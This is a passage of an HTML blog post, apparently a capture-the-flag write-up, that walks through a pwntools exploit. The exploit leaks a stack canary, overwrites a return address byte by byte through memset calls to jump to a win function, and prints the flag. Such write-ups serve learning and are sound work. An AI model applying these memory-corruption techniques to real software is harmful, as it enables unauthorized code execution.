+</span></span><span style="display:flex;"><span><span style="color:#111">snd</span><span style="color:#111">(</span><span style="color:#ae81ff">0x69</span><span style="color:#111">,</span> <span style="color:#d88200">b</span><span style="color:#d88200">&#39;a&#39;</span><span style="color:#111">)</span> <span style="color:#75715e"># offset between buf and canary+1 is 0x69</span>
+</span></span><span style="display:flex;"><span><span style="color:#111">p</span><span style="color:#f92672">.</span><span style="color:#111">recvuntil</span><span style="color:#111">(</span><span style="color:#d88200">b</span><span style="color:#d88200">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x69</span><span style="color:#111">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#111">canary</span> <span style="color:#f92672">=</span> <span style="color:#111">u64</span><span style="color:#111">(</span><span style="color:#d88200">b</span><span style="color:#d88200">&#39;</span><span style="color:#8045ff">\x00</span><span style="color:#d88200">&#39;</span><span style="color:#f92672">+</span><span style="color:#111">p</span><span style="color:#f92672">.</span><span style="color:#111">recvn</span><span style="color:#111">(</span><span style="color:#ae81ff">7</span><span style="color:#111">))</span>
+</span></span></code></pre></div><p>now we need to write into the return address, to do that using <code>memset</code> we will have to write the value backwards that is if you want for example to write b&rsquo;abcd&rsquo; into an address you do:</p>
+<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75af00">memset</span><span style="color:#111">(</span><span style="color:#111">address</span><span style="color:#111">,</span> <span style="color:#d88200">&#39;d&#39;</span><span style="color:#111">,</span> <span style="color:#ae81ff">4</span><span style="color:#111">)</span> <span style="color:#75715e">// address === b&#39;dddd&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#75af00">memset</span><span style="color:#111">(</span><span style="color:#111">address</span><span style="color:#111">,</span> <span style="color:#d88200">&#39;c&#39;</span><span style="color:#111">,</span> <span style="color:#ae81ff">3</span><span style="color:#111">)</span> <span style="color:#75715e">// address === b&#39;cccd&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#75af00">memset</span><span style="color:#111">(</span><span style="color:#111">address</span><span style="color:#111">,</span> <span style="color:#d88200">&#39;b&#39;</span><span style="color:#111">,</span> <span style="color:#ae81ff">2</span><span style="color:#111">)</span> <span style="color:#75715e">// address === b&#39;bbcd&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#75af00">memset</span><span style="color:#111">(</span><span style="color:#111">address</span><span style="color:#111">,</span> <span style="color:#d88200">&#39;a&#39;</span><span style="color:#111">,</span> <span style="color:#ae81ff">1</span><span style="color:#111">)</span> <span style="color:#75715e">// address === b&#39;abcd&#39;
+</span></span></span></code></pre></div><p>i made a python function that does this using memsets:</p>
+<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#00a8c8">def</span> <span style="color:#75af00">writeval</span><span style="color:#111">(</span><span style="color:#111">val</span><span style="color:#111">,</span> <span style="color:#111">offset</span><span style="color:#111">):</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#111">val</span> <span style="color:#f92672">=</span> <span style="color:#111">p64</span><span style="color:#111">(</span><span style="color:#111">val</span><span style="color:#111">)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00a8c8">for</span> <span style="color:#111">i</span> <span style="color:#f92672">in</span> <span style="color:#111">range</span><span style="color:#111">(</span><span style="color:#ae81ff">7</span><span style="color:#111">,</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#111">,</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#111">):</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#111">snd</span><span style="color:#111">(</span><span style="color:#111">offset</span><span style="color:#f92672">+</span><span style="color:#111">i</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span><span style="color:#111">,</span> <span style="color:#111">p8</span><span style="color:#111">(</span><span style="color:#111">val</span><span style="color:#111">[</span><span style="color:#111">i</span><span style="color:#111">]))</span>
+</span></span></code></pre></div><p>using this function we can write the address of win into the return address and we have to also rewrite the address of the stack canary since we overwrite it when we write into the retaddr.</p>
+<p>here is the final exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> <span style="color:#111">pwn</span> <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># p = process(&#34;./chal&#34;)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#00a8c8">def</span> <span style="color:#75af00">snd</span><span style="color:#111">(</span><span style="color:#111">sz</span><span style="color:#111">,</span> <span style="color:#111">c</span><span style="color:#111">):</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#111">p</span><span style="color:#f92672">.</span><span style="color:#111">sendlineafter</span><span style="color:#111">(</span><span style="color:#d88200">b</span><span style="color:#d88200">&#39;size &gt;&#39;</span><span style="color:#111">,</span> <span style="color:#111">str</span><span style="color:#111">(</span><span style="color:#111">sz</span><span style="color:#111">)</span><span style="color:#f92672">.</span><span style="color:#111">encode</span><span style="color:#111">())</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#111">p</span><span style="color:#f92672">.</span><span style="color:#111">sendlineafter</span><span style="color:#111">(</span><span style="color:#d88200">b</span><span style="color:#d88200">&#39;char &gt;&#39;</span><span style="color:#111">,</span> <span style="color:#d88200">b</span><span style="color:#d88200">&#39; &#39;</span><span style="color:#f92672">+</span><span style="color:#111">c</span><span style="color:#111">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#00a8c8">def</span> <span style="color:#75af00">writeval</span><span style="color:#111">(</span><span style="color:#111">val</span><span style="color:#111">,</span> <span style="color:#111">offset</span><span style="color:#111">):</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#111">val</span> <span style="color:#f92672">=</span> <span style="color:#111">p64</span><span style="color:#111">(</span><span style="color:#111">val</span><span style="color:#111">)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00a8c8">for</span> <span style="color:#111">i</span> <span style="color:#f92672">in</span> <span style="color:#111">range</span><span style="color:#111">(</span><span style="color:#ae81ff">7</span><span style="color:#111">,</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#111">,</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#111">):</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#111">snd</span><span style="color:#111">(</span><span style="color:#111">offset</span><span style="color:#f92672">+</span><span style="color:#111">i</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span><span style="color:#111">,</span> <span style="color:#111">p8</span><span style="color:#111">(</span><span style="color:#111">val</span><span style="color:#111">[</span><span style="color:#111">i</span><span style="color:#111">]))</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#111">snd</span><span style="color:#111">(</span><span style="color:#ae81ff">0x69</span><span style="color:#111">,</span> <span style="color:#d88200">b</span><span style="color:#d88200">&#39;a&#39;</span><span style="color:#111">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#111">p</span><span style="color:#f92672">.</span><span style="color:#111">recvuntil</span><span style="color:#111">(</span><span style="color:#d88200">b</span><span style="color:#d88200">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x69</span><span style="color:#111">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#111">canary</span> <span style="color:#f92672">=</span> <span style="color:#111">u64</span><span style="color:#111">(</span><span style="color:#d88200">b</span><span style="color:#d88200">&#39;</span><span style="color:#8045ff">\x00</span><span style="color:#d88200">&#39;</span><span style="color:#f92672">+</span><span style="color:#111">p</span><span style="color:#f92672">.</span><span style="color:#111">recvn</span><span style="color:#111">(</span><span style="color:#ae81ff">7</span><span style="color:#111">))</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#111">writeval</span><span style="color:#111">(</span><span style="color:#ae81ff">0x4011f6</span><span style="color:#111">,</span> <span style="color:#ae81ff">0x78</span><span style="color:#111">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#111">writeval</span><span style="color:#111">(</span><span style="color:#111">canary</span><span style="color:#111">,</span> <span style="color:#ae81ff">0x68</span><span style="color:#111">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#111">p</span><span style="color:#f92672">.</span><span style="color:#111">sendline</span><span style="color:#111">(</span><span style="color:#d88200">b</span><span style="color:#d88200">&#39;0&#39;</span><span style="color:#111">)</span> <span style="color:#75715e"># send 0 to return from main</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#111">p</span><span style="color:#f92672">.</span><span style="color:#111">interactive</span><span style="color:#111">()</span>
+</span></span></code></pre></div><p>running it we get the flag: <code>Alpaca{5anta_ch3ck5_y0ur_c4n4ry_tw1c3}</code></p>
+
+      
+      <div class="post-date">
+        <span class="g time">July 1, 2026 </span> &#8729;
+         
+         <a href="https://nothoudaifa.github.io/tags/ctf/">ctf</a> <a href="https://nothoudaifa.github.io/tags/pwn/">pwn</a>
+      </div>
+      
+    </section>
+    
+    
+    
+  </div>
+</main>
+</body>
+</html>
